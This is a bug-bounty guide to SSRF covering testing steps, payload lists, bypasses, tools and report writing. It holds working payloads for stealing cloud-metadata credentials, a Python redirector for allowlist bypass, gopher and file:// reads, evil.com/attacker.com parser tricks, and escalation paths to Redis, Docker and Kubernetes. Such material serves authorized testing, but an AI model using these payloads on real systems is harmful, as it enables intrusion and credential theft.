# Server-Side Request Forgery (SSRF)

> One-line summary: The server fetches a URL you control, letting you reach internal services and cloud metadata — pays high/critical when instance credentials or internal admin panels are reachable.

## Overview

SSRF occurs when an application takes user-supplied input (a URL, host, or path segment) and issues a server-side request with it, without controlling where that request can go. It arises in every "fetch this URL" feature — webhooks, avatar/image import, link previews, PDF and screenshot generators, integrations — and is worsened when the response is partially reflected back (full SSRF), status/timing leaks state (semi-blind), or only out-of-band callbacks fire (blind). Impact ranges from bypassing firewall/organization boundaries and port-scanning internal networks to reading cloud instance metadata at `169.254.169.254`, which yields IAM role credentials on AWS, service-account tokens on GCP/Azure, and often full cloud takeover. It pays because a single URL parameter escalates straight to infrastructure — the class of finding most programs rate critical.

## Where to find it

- URL-fetch features: image/avatar "import from URL", link preview/unfurling, RSS/feed readers, sitemap generators, "import from {Notion, Confluence, Google Sheets, Jira}"
- Webhooks: registration often validates the URL but delivery does not — test both; also test redirects from your webhook receiver back into internal space
- PDF/screenshot generators (headless Chrome is a full SSRF engine with JS): report export, invoice render, "download as PDF", URL-to-image
- File importers: SVG/HTML upload rendering external references, Office docs with remote images/OLE, "import CSV from URL"
- Proxy-style endpoints: `/proxy?url=`, image resizers (`?src=`, `?u=`), URL shorteners, oEmbed (`?url=`)
- Parameter names worth fuzzing: `url=`, `uri=`, `u=`, `link=`, `src=`, `source=`, `dest=`, `target=`, `path=`, `fetch=`, `load=`, `image=`, `callback=`, `webhook=`, `feed=`, `domain=`, `host=`, `port=`
- Partial-URL inputs: `https://{input}/status` templates, host allowlists where only the path is user-controlled
- GraphQL fields taking URLs; admin "test webhook" / "verify domain" buttons
- SSO/OIDC plumbing: `jwks_uri` or discovery URL overrides, WebFinger, SAML metadata fetch, SCIM endpoints

## Methodology

1. **Find candidates** — crawl plus JS analysis (LinkFinder, grep for `fetch(`/`axios`), API specs, and the feature list. Flag every parameter whose value looks like a URL/host and every feature that consumes remote content.
2. **Callback first** — replace the value with a Collaborator/interactsh URL with a unique path (`https://<unique>.oast.pro/ssrf1`). A DNS hit alone means blind SSRF; an HTTP hit proves full request control (you see method and headers in the interaction log).
3. **Classify** — full (response reflected), semi-blind (status/headers/timing leak), blind (callback only). Prioritize by what you can reach, not by class: blind reach to metadata beats full access to example.com.
4. **Probe internal reach** — request `http://127.0.0.1:<port>/` for common ports (22, 80, 443, 3000, 3306, 5432, 6379, 8080, 9200, 2375) and compare connect times and error strings; an open port answers fast, a filtered port hangs or refuses.
5. **Metadata** — hit the provider paths below. AWS IMDSv2 needs a `PUT /latest/api/token` first; if the sink can't send PUT, IMDSv1 is often still enabled on legacy instances. GCP/Azure/Oracle need a specific header — test only if the sink lets you set headers or if the value is a full raw request.
6. **Whitelist testing** — if only one host is allowed, chain redirects: host a 302 on an allowed host (or find an open redirect on target.com) that points at the metadata IP. If validation is DNS-based (resolved then fetched), try DNS rebinding.
7. **Confirm without damage** — GETs only against metadata and internal panels. No POSTs, no `FLUSHALL`, no writes to internal services; if testing Redis/SMTP, use non-destructive commands (`PING`, `HELO`).
8. **Prove impact** — a metadata response containing `AccessKeyId`/`SecretAccessKey`/`Token`, an internal admin panel's HTML, or a successful read-only AWS call (`aws sts get-caller-identity`) with the leaked keys. Report the exact parameter, full request, and full response.

## Payloads

```bash
# 1) Blind/full detection — unique path per test so you can correlate hits
curl -s "https://target.com/api/fetch?url=https://UNIQUE-STRING.oast.pro/ssrf-1" -H 'Cookie: session=...'

# 2) Loopback in encodings that defeat naive filters
http://127.0.0.1/
http://127.1/
http://2130706433/            # decimal
http://0x7f000001/            # hex
http://017700000001/          # octal
http://127.0.0.1.nip.io/      # DNS alias to loopback
http://[::1]/
http://[::ffff:127.0.0.1]/

# 3) AWS instance metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# returns the role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data

# 4) GCP (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target.com

# 5) Azure (requires header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# 6) Other clouds
http://100.100.100.200/latest/meta-data/        # Alibaba
http://169.254.169.254/metadata/v1/             # DigitalOcean
http://169.254.169.254/opc/v1/instance/         # Oracle (Authorization: Bearer Oracle)
```

```bash
# IMDSv2 flow (when you can control method + headers, e.g. a raw-request proxy feature)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

```bash
# Gopher → internal services (PHP-curl and some Java clients still allow it)
# Redis PING (non-destructive): gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a
python3 gopherus.py --exploit redis      # menu-driven payload generation

# Validate leaked AWS creds with a read-only call
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws sts get-caller-identity
```

```bash
# Redirect-based allowlist bypass: 302 from an "allowed" host to metadata.
# Host this, or reuse an open redirect on target.com:
python3 - <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        self.end_headers()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
EOF
# Then: ?url=http://YOUR-IP:8000/
```

## Bypasses & edge cases

- **IP encodings** — decimal, octal, hex, mixed (`0x7f.1`), short forms (`127.1`), IPv6 `[::1]`, IPv4-mapped `[::ffff:127.0.0.1]`, `0.0.0.0`, `[::]` — all typically reach loopback.
- **DNS tricks** — `localtest.me`, `127.0.0.1.nip.io`, `sslip.io` resolve to loopback with zero infrastructure; DNS rebinding (rbndr.us, 1u.ms) defeats validate-then-fetch flows: first lookup returns your public IP, second returns 127.0.0.1.
- **Redirects** — validation runs on the URL you supply; the fetch follows 302s. Chain through any open redirect on the target to reach `file:///` or metadata, defeating per-request URL checks.
- **URL parser confusion** — `https://allowed.com@evil.com/`, `https://evil.com#allowed.com`, `https://evil.com?allowed.com`, `https://allowed.com\@evil.com` (backslash treated as `/` by some parsers), double `%40`, tab/newline inside the authority.
- **Scheme abuse** — `file:///etc/passwd` and `file:///c:/windows/win.ini` for reads; `dict://`, `ftp://`, `gopher://` for raw protocols; `jar:http://host/!/` in Java; `netdoc://`/`smb://` in legacy Java.
- **Header-needing metadata** — GCP/Azure/Oracle need a specific header; the persistent workaround is gopher (you control the raw bytes) or a redirector that injects the header — but plain URL sinks can't set headers, so deprioritize.
- **Partial-URL inputs** — when only the host is user input (`https://{input}/status`), injecting `127.0.0.1:8080` changes port and target, `169.254.169.254` reads metadata, and `attacker.com/x?y=` rewrites the whole request line.
- **IPv6 zone/oddities** — `[::ffff:169.254.169.254]`, `fe80::1%25eth0`, `[0:0:0:0:0:ffff:7f00:1]`.
- **Non-curl fetchers** — headless Chrome and wkhtmltopdf can be pointed at `file://` if the scheme filter missed them; ImageMagick historically fetched `https://` and `ftp://` via `image=` parameters.
- **301 vs fetch-follow** — some sinks only follow 301/302, not 307/308; test all redirect codes and both `Location` casing tricks.

## Tools

- `interactsh-client` — out-of-band DNS/HTTP catcher:
```bash
interactsh-client -v
# paste the printed https://<random>.oast.pro/xxx into the parameter; hits appear live
```
- Burp Collaborator — same idea inside Burp: Collaborator client → "Copy to clipboard" payload; the "Collaborator Everywhere" extension injects callbacks into every proxied request automatically.
- SSRFmap — module-driven exploitation of a saved request:
```bash
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan
```
- Gopherus — gopher payloads for MySQL/Redis/FastCGI/SMTP: `python3 gopherus.py --exploit mysql`
- nuclei:
```bash
nuclei -u https://target.com -tags ssrf
```
- AWS CLI — read-only proof of leaked credentials: `aws sts get-caller-identity`

## Escalation & chaining

- **SSRF → cloud metadata → IAM keys** — read `iam/security-credentials/<role>`, validate with `aws sts get-caller-identity`, then enumerate strictly read-only (`aws s3 ls`, `aws iam list-users` — stay in scope) to size the blast radius for the report.
- **SSRF → unauthenticated internal services** — Redis (`CONFIG SET dir`/`dbfilename` RCE paths), Docker API `http://127.0.0.1:2375/containers/json` → `exec` on the host, Elasticsearch `_cat/indices` → PII, RabbitMQ/Kibana/Grafana admin panels.
- **SSRF → Kubernetes** — `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` using the service-account token that in-pod SSRF can usually reach via `http://127.0.0.1:10255/pods` or app env leakage.
- **SSRF + open redirect** — an open redirect on the target turns a strict host allowlist into free internal access.
- **Blind SSRF → measured port scan** — time-differential scans identify internal CI (Jenkins `/api/json`, `/script`), whose build logs commonly leak credentials, turning blind SSRF into full compromise.
- **Webhook SSRF → internal APIs that trust source IPs** — the webhook fires from the server's network position, bypassing network-level authorization on internal APIs.

## Report notes

- Collaborator/interactsh interaction IDs plus full DNS/HTTP interaction details (source IP, headers) with timestamps — this is the whole evidence base for blind SSRF.
- Raw HTTP request (Burp export) for the vulnerable parameter, and the exact URL value used; note any encoding.
- For metadata: the response body with keys (redact all but a short prefix, e.g. `AKIA...XXXX`), plus the read-only validation call's output proving the credentials are live.
- Quantify reach: which internal hosts/ports responded, what each returned (one line each), and whether headers/schemes were restricted so triage can reproduce with confidence.
- Impact sentence tying parameter to consequence: "Unauthenticated `url=` on `POST /api/fetch` reaches EC2 metadata, leaking IAM role credentials with S3 read access to the prod bucket."
- State limitations (IMDSv2 enforced, only DNS callbacks) plainly — an honest blind-SSRF report with port evidence still pays; an overstated one gets closed.

## References

- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger — Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Orange Tsai — A New Era of SSRF (URL parser exploitation)](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [AWS — Instance metadata and user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Google Cloud — Metadata service overview](https://cloud.google.com/compute/docs/metadata/overview)
- [Azure — Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [OWASP — SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
